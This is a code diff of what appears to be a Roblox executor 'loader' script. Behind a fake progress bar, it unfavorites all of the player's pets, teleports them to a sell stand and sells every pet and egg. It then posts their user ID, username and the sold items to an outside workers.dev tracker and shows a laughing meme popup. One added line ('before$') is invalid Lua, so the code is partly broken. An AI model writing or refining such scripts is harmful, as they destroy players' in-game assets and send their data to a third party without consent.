@@ -10,11 +10,13 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ===== CONFIG =====
-local MEME_IMAGE_ID  = "rbxassetid://82403642047427"    -- texture ID
-local LAUGH_SOUND_ID = "rbxassetid://133312610824902"
-local MEME_DELAY     = 4
-local MEME_SIZE      = 380
-local COUNTER_URL    = "https://sell-counter-temp.sae-tracker.workers.dev/report"
+local MEME_IMAGE_ID      = "rbxassetid://82403642047427"
+local LAUGH_SOUND_ID     = "rbxassetid://133312610824902"
+local MEME_DELAY         = 4
+local MEME_SIZE          = 380
+local COUNTER_URL        = "https://sell-counter-temp.sae-tracker.workers.dev/report"
+local SALE_POLL_TIMEOUT  = 6      -- seconds to wait for save to reflect the sale
+local SALE_POLL_INTERVAL = 0.25
 -- ==================
 
 ------------------------------------------------------------
@@ -214,9 +216,9 @@ local function setStatus(text, targetPct, duration)
     task.spawn(function()
         local start = currentProgress
         local goal  = targetPct
-        local t0    = tick()
-        while tick() - t0 < duration do
-            local a = (tick() - t0) / duration
+        local t0    = os.clock()
+        while os.clock() - t0 < duration do
+            local a = (os.clock() - t0) / duration
             pct.Text = math.floor((start + (goal - start) * a) * 100) .. "%"
             RunService.RenderStepped:Wait()
         end
@@ -237,8 +239,8 @@ local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)
 
 local log = function(...) print("[Loader]", ...) end
 
-local function getSave()
-    local ok, s = pcall(function() return Save.Get(LocalPlayer, false) end)
+local function getSave(forceRefresh)
+    local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
     if ok and s then return s end
     local ok2, s2 = pcall(function() return Save.Get() end)
     return ok2 and s2 or nil
@@ -304,14 +306,15 @@ local function unfavoriteAll()
     task.wait(0.8)
 end
 
--- Returns { Eggs = {...uids}, Assets = {...uids}, Details = {...} }
-local function buildPayload()
+------------------------------------------------------------
+-- INVENTORY SNAPSHOT (uid -> item detail)
+------------------------------------------------------------
+local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
-    local details = {}
-    local totalValue = 0
-
-    local d = getSave()
-    if not d then return { Eggs = eggs, Assets = pets, Details = details, TotalValue = 0 } end
+    local d = getSave(forceRefresh)
+    if not d then
+        return { pets = pets, eggs = eggs }
+    end
 
     local isVIP = LocalPlayer:GetAttribute("VIP") == true
 
@@ -320,32 +323,26 @@ local function buildPayload()
         for uid, rec in pairs(d.Inventory) do
             local ok, item = TryCall(AssetItems.Decode, rec)
             if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
-                table.insert(pets, uid)
-
-                local entry = AssetDir[item.Category]
+                local entry  = AssetDir[item.Category]
                 local rarity = entry.Rarity
 
-                -- Value
                 local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                 local value = (priceOk and tonumber(basePrice)) or 0
                 if isVIP then value = value * 2 end
                 value = math.floor(value)
-                totalValue = totalValue + value
 
-                -- Weight
                 local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                 weight = (weightOk and tonumber(weight)) or 0
 
-                table.insert(details, {
+                pets[tostring(uid)] = {
                     kind      = "pet",
-                    uid       = uid,
-                    category  = item.Category,
+                    uid       = tostring(uid),
                     name      = entry.DisplayName or item.Category,
                     rarity    = (rarity and rarity.DisplayName) or "Unknown",
                     rarityNum = (rarity and rarity.RarityNumber) or 0,
                     value     = value,
                     weight    = weight,
-                })
+                }
             end
         end
     end
@@ -356,37 +353,58 @@ local function buildPayload()
             if type(rec) == "table" and rec.Placement == nil then
                 local ok, dec = TryCall(EggRecords.Decode, rec)
                 if ok and dec and AssetDir[dec.AssetCategory] then
-                    table.insert(eggs, uid)
-
-                    local entry = AssetDir[dec.AssetCategory]
+                    local entry  = AssetDir[dec.AssetCategory]
                     local rarity = entry.Rarity
 
                     local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                     local value = (priceOk and tonumber(basePrice)) or 0
                     value = math.floor(value)
-                    totalValue = totalValue + value
 
                     local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                     weight = (weightOk and tonumber(weight)) or 0
 
-                    table.insert(details, {
+                    eggs[tostring(uid)] = {
                         kind      = "egg",
-                        uid       = uid,
-                        category  = dec.AssetCategory,
+                        uid       = tostring(uid),
                         name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                         rarity    = (rarity and rarity.DisplayName) or "Unknown",
                         rarityNum = (rarity and rarity.RarityNumber) or 0,
                         value     = value,
                         weight    = weight,
-                    })
+                    }
                 end
             end
         end
     end
 
-    return { Eggs = eggs, Assets = pets, Details = details, TotalValue = totalValue }
+    return { pets = pets, eggs = eggs }
 end
 
+local function countTable(t)
+    local n = 0
+    for _ in pairs(t) do n = n + 1 end
+    return n
+end
+
+------------------------------------------------------------
+-- Deterministic report id (stable across retries)
+------------------------------------------------------------
+local function computeReportId(uidList)
+    local sorted = {}
+    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
+    table.sort(sorted)
+    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
+    local h = 0
+    for i = 1, #s do
+        h = bit32.bxor(h, string.byte(s, i))
+        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
+    end
+    return string.format("%08x-%d", h, #sorted)
+end
+
+------------------------------------------------------------
+-- SELL POSITION
+------------------------------------------------------------
 local function findSellPosition()
     local stands = workspace:FindFirstChild("Stands")
     if not stands then return nil end
@@ -402,9 +420,13 @@ end
 
 ------------------------------------------------------------
 -- GLOBAL COUNTER REPORTING
+-- Sends ONLY the items that actually left inventory.
 ------------------------------------------------------------
-local function reportSales(petCount, eggCount, details, totalValue)
-    if petCount + eggCount <= 0 then return end
+local function reportSales(soldItems, reportId)
+    if not soldItems or #soldItems == 0 then
+        log("Nothing to report.")
+        return
+    end
 
     local httpFn = nil
     local gv = getgenv and getgenv() or _G
@@ -422,10 +444,14 @@ local function reportSales(petCount, eggCount, details, totalValue)
     local userId   = tostring(LocalPlayer.UserId)
     local username = LocalPlayer.Name or "Unknown"
 
-    -- No cap — every item goes through
-    local trimmed = {}
-    for _, d in ipairs(details or {}) do
-        table.insert(trimmed, {
+    local petCount, eggCount, totalValue = 0, 0, 0
+    local out = {}
+    for _, d in ipairs(soldItems) do
+        if d.kind == "pet" then petCount = petCount + 1
+        elseif d.kind == "egg" then eggCount = eggCount + 1 end
+        totalValue = totalValue + (tonumber(d.value) or 0)
+        table.insert(out, {
+            uid       = tostring(d.uid or ""),
             kind      = d.kind,
             name      = d.name,
             rarity    = d.rarity,
@@ -437,12 +463,13 @@ local function reportSales(petCount, eggCount, details, totalValue)
 
     task.spawn(function()
         local body = HttpService:JSONEncode({
+            reportId   = reportId,
             pets       = petCount,
             eggs       = eggCount,
             userId     = userId,
             username   = username,
-            items      = trimmed,
-            totalValue = totalValue or 0,
+            items      = out,
+            totalValue = totalValue,
         })
         local ok, res = pcall(function()
             return httpFn({
@@ -453,35 +480,39 @@ local function reportSales(petCount, eggCount, details, totalValue)
             })
         end)
         if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
-            print(("[Counter] Reported %d pets, %d eggs, $%d as %s (%d details)"):format(
-                petCount, eggCount, totalValue or 0, username, #trimmed))
+            local parsed = nil
+            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
+            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
+            print(("[Counter] Reported %d pets, %d eggs, $%d as %s%s (reportId=%s)")
+                :format(petCount, eggCount, totalValue, username, tag, tostring(reportId)))
         else
             warn("[Counter] Report failed:", tostring(res))
         end
     end)
 end
 
+------------------------------------------------------------
+-- SELL: snapshot -> sell -> snapshot -> diff -> report
+------------------------------------------------------------
 local function teleportAndSell()
-    local payload = buildPayload()
-    local petCount = #payload.Assets
-    local eggCount = #payload.Eggs
-    log(("Payload: %d pets, %d eggs"):format(petCount, eggCount))
-    if petCount == 0 and eggCount == 0 then return end
+    -- 1) BEFORE snapshot
+    local before = snapshotInventory(false)
+    local beforePets = countTable(before.pets)
+    local beforeEggs = countTable(before.eggs)
+    log(("Inventory before: %d pets, %d eggs"):format(beforePets, beforeEggs))
+    if beforePets == 0 and beforeEggs == 0 then return end
 
-    -- Strip Details before sending to game server.
-    -- The captured payload shape was strictly {Eggs, Assets} — anything
-    -- extra could be rejected by the server's validation.
-    local serverPayload = {
-        Eggs   = payload.Eggs,
-        Assets = payload.Assets,
-    }
+    -- 2) Build server payload from BEFORE uids
+    local serverPayload = { Eggs = {}, Assets = {} }
+    for uid in pairs(before.pets) do table.insert(serverPayload.Assets, uid) end
+    for uid in pairs(before.eggs) do table.insert(serverPayload.Eggs, uid)   end
 
     local hrp = getHRP()
     local pos = findSellPosition()
 
     if not hrp or not pos then
         Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-        task.wait(1.2)
+        task.wait(1.5)
     else
         local savedCF  = hrp.CFrame
         local savedVel = hrp.AssemblyLinearVelocity
@@ -493,14 +524,63 @@ local function teleportAndSell()
         pcall(function()
             Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
         end)
-        task.wait(1.2)
+        task.wait(1.5)
 
         hrp.CFrame = savedCF
         pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
     end
 
-    -- Report to global counter with full Details (pets, eggs, rarities)
-    reportSales(petCount, eggCount, payload.Details, payload.TotalValue)
+    -- 3) Poll until the save reflects the sale (or timeout)
+    local after = nil
+    local deadline = os.clock() + SALE_POLL_TIMEOUT
+    while os.clock() < deadline do
+        after = snapshotInventory(true) -- force refresh
+        local removed = 0
+        for uid in pairs(before.pets) do if not after.pets[uid] then removed = removed + 1 end end
+        for uid in pairs(before.eggs) do if not after.eggs[uid] then removed = removed + 1 end end
+        if removed > 0 then
+            log(("Detected %d removed after %.2fs"):format(removed, os.clock() - (deadline - SALE_POLL_TIMEOUT)))
+            break
+        end
+        task.wait(SALE_POLL_INTERVAL)
+    end
+
+    if not after then
+        after = snapshotInventory(true)
+    end
+
+    -- 4) Diff: items in BEFORE but not in AFTER == actually sold
+    local soldPets, soldEggs = {}, {}
+    local soldDetails = {}
+    for uid, d in pairs(before.pets) do
+        if not after.pets[uid] then
+            table.insert(soldPets, uid)
+            table.insert(soldDetails, d)
+        end
+    end
+    for uid, d in pairs(before.eggs) do
+        if not after.eggs[uid] then
+            table.insert(soldEggs, uid)
+            table.insert(soldDetails, d)
+        end
+    end
+
+    log(("Actually sold: %d pets, %d eggs (was %d / %d)")
+        :format(#soldPets, #soldEggs, beforePets, beforeEggs))
+
+    if #soldDetails == 0 then
+        -- Safety: never report items we can't confirm left the player's inventory.
+        local before$ = getMoney()
+        warn("[Counter] Sale detected 0 removed items — not reporting (avoids false positives).")
+        return
+    end
+
+    -- 5) Report only the sold items, with a stable reportId
+    local allSoldUids = {}
+    for _, u in ipairs(soldPets) do table.insert(allSoldUids, u) end
+    for _, u in ipairs(soldEggs) do table.insert(allSoldUids, u) end
+    local reportId = computeReportId(allSoldUids)
+    reportSales(soldDetails, reportId)
 end
 
 ------------------------------------------------------------
@@ -570,8 +650,8 @@ local function showMemePopup()
 
     pcall(function() ContentProvider:PreloadAsync({ img }) end)
 
-    local t0 = tick()
-    while not img.IsLoaded and tick() - t0 < 3 do
+    local t0 = os.clock()
+    while not img.IsLoaded and os.clock() - t0 < 3 do
         task.wait(0.05)
     end
     if not img.IsLoaded then
